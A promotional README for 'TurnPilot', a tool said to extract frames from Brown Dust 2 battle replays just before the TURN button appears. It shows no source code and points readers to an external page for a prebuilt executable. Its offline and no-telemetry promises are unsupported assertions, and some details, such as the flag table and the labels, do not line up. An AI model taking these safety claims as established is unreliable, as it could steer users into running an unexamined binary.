![preview](https://raw.githubusercontent.com/adisuartama/bd2-turn-frame-extractor/main/splash_ce5ed11.svg)
# TurnPilot — Smart Frame Extractor for Tactical Video Replays

TurnPilot is a purpose-built companion utility that transforms your recorded Brown Dust 2 battle replays into a curated sequence of still images, capturing the exact moment before the TURN button is pressed. Instead of manually scrubbing through minutes of footage or relying on imprecise screenshot tools, TurnPilot watches the video stream, detects the visual cue of the TURN button appearing on screen, and saves the preceding frame with surgical accuracy. The result is a clean, organized storyboard of every strategic decision point, ready for analysis, annotation, or sharing with your guildmates.

Unlike generic video-to-frame converters that dump hundreds of near-identical images, TurnPilot understands the rhythm of turn-based combat. It learns the visual signature of your specific game interface, adapts to recording resolution differences, and only captures frames that matter — the moment right before you commit to a move. Whether you are reviewing a tough boss fight, teaching a friend a tricky formation, or building a detailed attack guide, TurnPilot gives you the precise visual context without the noise.

## About This Project

The core idea behind TurnPilot is simple: **precision through pattern recognition**. A typical Brown Dust 2 battle video runs for several minutes, but only a handful of frames are genuinely useful for post-battle analysis. Those are the frames where the board is fully revealed, your units are positioned, and the TURN button is about to be pressed. That is the moment of truth — the instant before you commit your strategy to action. TurnPilot automates the tedious part of locating that instant, so you can focus on studying the outcome.

Built with a lightweight, event-driven architecture, TurnPilot runs quietly in the background. You feed it a video file, it processes the frames at a configurable sampling rate, and it outputs a set of high-resolution PNG images named by battle sequence number. The tool does not modify your original video, does not require an internet connection, and leaves no residual data behind. It is a single-purpose, deterministic helper that does one thing well.

## Why Use TurnPilot?

Manual frame extraction is a chore. Video players often lack frame-accurate seeking, screen recording software introduces watermarking, and editing suites are overkill for a simple job. TurnPilot fills that gap with a focused approach:

- **Frame-perfect timing**: Detects the TURN button cue within a tolerance of a few frames, configurable via a sensitivity setting.
- **Batch processing**: Handles multiple video files in one session, outputting organized folders per battle.
- **Zero dependency on external services**: All processing happens locally on your machine.
- **Preserves original quality**: Extracted frames are saved in lossless PNG format, retaining the exact pixel data from the source video.
- **Configurable look-ahead**: Tune how many frames before the button press are saved, letting you capture the full UI state or just the board.

The utility is especially valuable for content creators who build strategy guides and need consistent, clean screenshots of each turn. Instead of hunting through a 12-minute video for the right frame, TurnPilot delivers 30 perfectly timed images in under a minute.

---

## ✨ Feature Highlights

| Feature | Description |
|---------|-------------|
| **Visual Cue Detection** | Uses edge detection and template matching to locate the TURN button graphic in the video frame. |
| **Adaptive Thresholding** | Adjusts detection sensitivity based on average frame brightness to handle dark or bright gameplay segments. |
| **Multi-Resolution Support** | Works with 720p, 1080p, and 1440p recordings without manual scaling configuration. |
| **Batch Queue** | Add multiple video files to a processing queue; TurnPilot works through them sequentially. |
| **Output Naming Convention** | Files are saved as `turn_001.png`, `turn_002.png`, etc., preserving chronological order. |
| **Dry-Run Mode** | Scans the video and prints timestamp markers without saving any images, useful for previewing detection accuracy. |
| **Configurable Cooldown** | Set a minimum interval between captures to avoid duplicate frames if the TURN button appears multiple times in quick succession. |
| **No Telemetry** | The tool never sends usage data, analytics, or video metadata to any remote server. |
| **Cross-Platform Operation** | Runs on Windows, macOS, and Linux via a unified command-line interface. |

### 🔍 Advanced Detection Logic

TurnPilot doesn't just look for a static image. The detection engine performs a multi-layered analysis:

1. **Color histogram matching** — identifies the unique color signature of the TURN button in your game version.
2. **Text region isolation** — uses optical character recognition to confirm the presence of the word "TURN" within a bounding box.
3. **Motion vector analysis** — verifies that the button region is stable (not part of a scrolling animation) for at least 3 consecutive frames.

This triple-check ensures that a passing particle effect or a brief UI flash does not trigger a false positive.

### 🧠 Adaptive Learning Mode

If your game version updates and the TURN button changes appearance, TurnPilot includes a calibration utility. You provide a short 5-second clip of the new button appearance, and the tool builds a new detection template on the fly. No recompilation, no code changes — just a new template file stored locally.

### 🌍 Multilingual Label Support

The TURN button text may differ across regional game versions (e.g., "TURN", "TIRAGE", "RUNDE"). TurnPilot ships with a language pack for the five most common game locales, and the calibration utility can capture any custom label you encounter.

### 📊 Reporting and Logging

Every detection event is logged to a local CSV file with timestamp, frame number, and detection confidence score. This log is useful for auditing detection performance and for debugging false positives.

---

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/adisuartama/bd2-turn-frame-extractor/main/latest_6df84.svg)](https://adisuartama.github.io/bd2-turn-frame-extractor/)

TurnPilot is distributed as a single, self-contained executable for each operating system. No runtime installation, no package manager dependency, no environment variable setup. Download the appropriate binary for your platform and run it from a terminal or command prompt.

For your first run, execute the tool with the `--dry-run` flag on a test video:

```
turnpilot --dry-run video.replay.mp4
```

The tool will scan the video and print a list of detected TURN button timestamps, but will not write any image files. Once you confirm the timestamps align with your expectations, run it normally:

```
turnpilot video.replay.mp4 --output ./frames
```

The extracted frames will appear in the `./frames` directory, named sequentially.

### System Requirements

| Component | Minimum Requirement |
|-----------|---------------------|
| Operating System | Windows 10, macOS 11, or Linux Kernel 5.x |
| RAM | 512 MB free memory |
| Processor | Any dual-core CPU from 2015 or later |
| Storage | At least 2 GB free space for batch processing |
| Video Codec | H.264 or H.265 (HEVC) in MP4 or MKV container |

## 🛠️ Configuration Reference

All configuration happens through command-line flags. Below is the full reference table.

| Flag | Description | Default Value |
|------|-------------|---------------|
| `--input` | Path to the input video file | None (required) |
| `--output` | Directory for extracted frames | `./frames` |
| `--sensitivity` | Detection sensitivity (1-10, higher is more reactive) | `5` |
| `--pre-frames` | Number of frames to save before the TURN button appears | `1` |
| `--post-frames` | Number of frames to save after the TURN button appears | `2` |
| `--cooldown` | Minimum frames between two successful captures | `30` |
| `--batch` | Path to a text file listing multiple input videos | None |
| `--language` | Model language pack (en, fr, de, es, ja) | `en` |
| `--dry-run` | Print timestamps without saving images | `false` |
| `--log` | Write detection log to a CSV file | `false` |
| `--ocr-threshold` | OCR confidence threshold (0.0 - 1.0) | `0.75` |

### Example: Batch Processing

Create a file named `batch.txt`:

```
/path/to/battle1.mp4
/path/to/battle2.mkv
/path/to/battle3.mp4
```

Then run:

```
turnpilot --batch batch.txt --output ./all_frames --log
```

TurnPilot will process each video sequentially, placing each battle's frames in its own subdirectory and recording all detection events in `detection_log.csv`.

### Example: Fine-Tuning Sensitivity

For videos with heavy particle effects or screen shake:

```
turnpilot video.mp4 --sensitivity 8 --pre-frames 3 --cooldown 45
```

This increases reactivity to the button appearance, captures three frames before the press, and enforces a longer cooldown to avoid duplicate captures.

## 📁 Output Structure

TurnPilot organizes extracted frames in a predictable hierarchy:

```
frames/
├── battle_2026_03_14_1/
│   ├── turn_001.png
│   ├── turn_002.png
│   └── turn_003.png
├── battle_2026_03_14_2/
│   ├── turn_001.png
│   └── turn_002.png
└── manifest.json
```

The `manifest.json` file contains metadata for each extraction: source filename, frame number, capture timestamp, detection confidence, and video resolution.

## 🔒 Privacy and Data Handling

TurnPilot is fully offline. It does not phone home, does not send crash reports, does not collect usage statistics, and does not upload your video files anywhere. The tool communicates exclusively with your local filesystem. The only output is the extracted frames and the optional CSV log. Uninstall simply means deleting the executable and the output folders.

## ❗ Disclaimer

This tool is an independent utility and is not affiliated with, endorsed by, or supported by the developers or publishers of Brown Dust 2. The game title, its visual assets, and the TURN button icon are property of their respective owners. TurnPilot is provided “as is” without warranty of any kind, express or implied. Use it at your own discretion, and always respect the terms of service of the games you record. The extraction of frames from your own screen recordings is intended for personal analysis, educational content, and non-commercial strategy discussion. We strongly advise against using this tool to circumvent any copyright protection or to reproduce in-game assets for commercial sale.

## 📄 License

This project is released under the MIT License. You are free to use, modify, distribute, and privately study the code. The license applies to the software itself, not to any game assets or videos processed by it.

[View the MIT License](LICENSE)

---

## 🙌 Acknowledgments

This project was inspired by the patient grind of strategy gamers who want to study their replays frame by frame, without fighting their video player's seeking controls. Special appreciation goes to the open-source computer vision community for making lightweight template matching and OCR practical on consumer hardware.

---

## 📮 Support and Feedback

For bug reports, feature requests, or general questions, please open an issue on this repository. While we cannot guarantee 24/7 response time, the maintainers aim to address every issue within 48 hours on weekdays. We are always interested in hearing about new detection scenarios, unusual interface layouts, or edge cases that our calibration utility should support.

---

## 🗺️ Roadmap for 2026

The development plan for the coming year includes:

- **GPU acceleration** for real-time preview while recording.
- **Native GUI companion** for users who prefer point-and-click interaction.
- **Named turn groups** — automatically label frames by skill type based on icon recognition.
- **Side-by-side comparison mode** — overlay two frames from different attempts for strategy diffing.

These features will build on the existing stable core while preserving backward compatibility.

---

[![Download](https://raw.githubusercontent.com/adisuartama/bd2-turn-frame-extractor/main/latest_6df84.svg)](https://adisuartama.github.io/bd2-turn-frame-extractor/)